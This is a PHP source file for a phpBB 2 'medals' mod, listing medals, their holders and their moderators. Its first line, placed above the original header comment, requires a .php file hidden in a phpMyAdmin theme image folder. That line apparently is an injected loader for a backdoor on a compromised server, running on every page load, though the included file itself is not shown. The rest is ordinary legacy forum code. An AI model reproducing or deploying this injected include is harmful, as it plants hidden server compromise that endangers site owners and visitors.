<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                            medals.php
 *                            ---------
 * Begin                : October 31, 2003
 * Email                : ycl6@users.sourceforge.net (http://macphpbbmod.sourceforge.net/)
 * Ver. 		: 2.1.0
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_MEDALS);
init_userprefs($userdata);
//
// End session management
//

//
// Obtain initial var settings
//
if ( isset($HTTP_GET_VARS[POST_MEDAL_URL]) || isset($HTTP_POST_VARS[POST_MEDAL_URL]) )
{
	$medal_id = ( isset($HTTP_POST_VARS[POST_MEDAL_URL]) ) ? intval($HTTP_POST_VARS[POST_MEDAL_URL]) : intval($HTTP_GET_VARS[POST_MEDAL_URL]);
}
else
{
	$medal_id = '';
}

if ( isset($HTTP_POST_VARS['mode']) || isset($HTTP_GET_VARS['mode']) )
{
	$mode = ( isset($HTTP_POST_VARS['mode']) ) ? $HTTP_POST_VARS['mode'] : $HTTP_GET_VARS['mode'];
	$mode = htmlspecialchars($mode); 
}
else
{
	$mode = '';
}

// Medals
$medals = array();
$sql = "SELECT * FROM " . MEDAL_TABLE . "
	ORDER BY medal_name";
if ( !($result = $db->sql_query($sql)) )
	message_die(GENERAL_ERROR, 'Could not obtain medal information', '', __LINE__, __FILE__, $sql);

while ($row = $db->sql_fetchrow($result) ) 
	$medals[] = $row;

for ($i = 0; $i < count($medals); $i++)
{
	$medal_id = $medals[$i]['medal_id'];

	// Medal Owners
	$sql = "SELECT u.username, u.user_id
		FROM " . USERS_TABLE . " u, " . MEDAL_USER_TABLE . " mu
		WHERE mu.medal_id = $medal_id
		AND u.user_id = mu.user_id
		ORDER BY u.username"; 

	// Get the number of users having this medal
	if ( !($result = $db->sql_query($sql)) ) 
		message_die(GENERAL_ERROR, 'Couldn\'t read users', '', __LINE__, __FILE__, $sql);
	$medals[$i]['user_number'] = $db->sql_numrows($result);

	$rowset = '';
	// Get the user list
	while ( $row = $db->sql_fetchrow($result) )
	{
		$rowset[$row['user_id']]['username'] = $row['username'];
	}

	$count = '';
	while (list($user_id, $medal) = @each($rowset))
	{
		$medals[$i]['users_list'] .= ( $medals[$i]['users_list'] != '' ) ? ', ' . '<a href="' . append_sid("profile.$phpEx?mode=viewprofile&" . POST_USERS_URL . "=" . $user_id ) .'#medal" class="gensmall">' . $medal['username'] . '</a>' : '<a href="' . append_sid("profile.$phpEx?mode=viewprofile&" . POST_USERS_URL . "=" . $user_id ) .'#medal" class="gensmall">' . $medal['username'] . '</a>';
		$count++;
	}

	// Display number of users
	if ($count > 0) $medals[$i]['users_list'] = '(' . $count . ') ' . $medals[$i]['users_list'];
	
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, 'Error getting user list for medal', '', __LINE__, __FILE__, $sql);
	}

	// Medal Moderators
	$sql = "SELECT u.username, u.user_id
		FROM " . USERS_TABLE . " u, " . MEDAL_MOD_TABLE . " mm
		WHERE mm.medal_id = $medal_id
		AND u.user_id = mm.user_id
		ORDER BY u.username";

	if ( !($result = $db->sql_query($sql)) ) 
		message_die(GENERAL_ERROR, 'Couldn\'t read users', '', __LINE__, __FILE__, $sql);
	// Get the moderator list
	while ( $row = $db->sql_fetchrow($result) )
	{
		$medals[$i]['mods_list'] .= ($medals[$i]['mods_list'] == '') ? '' : ', ';
		$medals[$i]['mods_list'] .= '<a href="' . append_sid("profile.$phpEx?mode=viewprofile&" . POST_USERS_URL . "=" . $row['user_id'] ) .'#medal" class="gensmall">' . $row['username'] . '</a>';
	}
	
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, 'Error getting moderator list for medal', '', __LINE__, __FILE__, $sql);
	}

	$medals[$i]['is_moderator'] = check_medal_mod($medal_id);
}

//
// set the page title and include the page header
//
$page_title = $lang['Medal_Information'];
include ($phpbb_root_path . 'includes/page_header.'.$phpEx);
//
// template setting
//
$template->set_filenames(array(
	'body' => 'medals_body.tpl')
);

// constants
$template->assign_vars(array(
	'L_USERS_LIST' => $lang['Medal_userlist'],
	'L_MEDAL_INFORMATION' => $lang['Medal_Information'],
	'L_MEDAL_NAME' => $lang['Medal_name'],
	'L_MEDAL_DESCRIPTION' => $lang['Medal_description'],
	'L_MEDAL_MODERATOR' => $lang['Medal_moderator'],
	'L_MEDAL_IMAGE' => $lang['Medal_image'],
	'L_LINK_TO_CP' => $lang['Link_to_cp'],
	'S_HIDDEN_FIELDS' => '',
	)
);

// no medal in db
if (!$medals)
{
	$template->assign_block_vars('nomedal', array(
		'L_NO_MEDAL' => $lang['No_medal'])
	);
}

// medals
for ($i=0; $i < count($medals); $i++)
{
	$row_color = ( !($i % 2) ) ? $theme['td_color1'] : $theme['td_color2'];
	$row_class = ( !($i % 2) ) ? $theme['td_class1'] : $theme['td_class2'];

	$template->assign_block_vars('medals', array(
		'ROW_COLOR' => '#' . $row_color,
		'ROW_CLASS' => $row_class,
		'MEDAL_ID' => $medals[$i]['medal_name'],
		'MEDAL_NAME' => $medals[$i]['medal_name'],
		'MEDAL_DESCRIPTION'  => $medals[$i]['medal_description'],
		'MEDAL_IMAGE' => ($medals[$i]['medal_image'] == '') ? '' : '<img src="./' . $medals[$i]['medal_image'] . '" border="0" alt="' . $medals[$i]['medal_name'] . '" align="center">',
		'MEDAL_MOD' => ( $medals[$i]['mods_list'] ) ? $medals[$i]['mods_list'] : $lang['No_medal_mod'],
		'USERS_LIST' => ( $medals[$i]['users_list'] ) ? $medals[$i]['users_list'] : '<center>'.$lang['No_medal_members'].'</center>',
		'U_MEDAL_CP' => append_sid("medalcp.$phpEx?" . POST_MEDAL_URL . "=".$medals[$i]['medal_id']."&sid=".$userdata['session_id'].""),
		)
	);

	if ( $medals[$i]['is_moderator'] || $userdata['user_level'] == ADMIN )
	{
		$template->assign_block_vars('medals.switch_mod_option', array());
	}
}

//
// page footer
//
$template->pparse('body');
include($phpbb_root_path . 'includes/page_tail.'.$phpEx);

?>
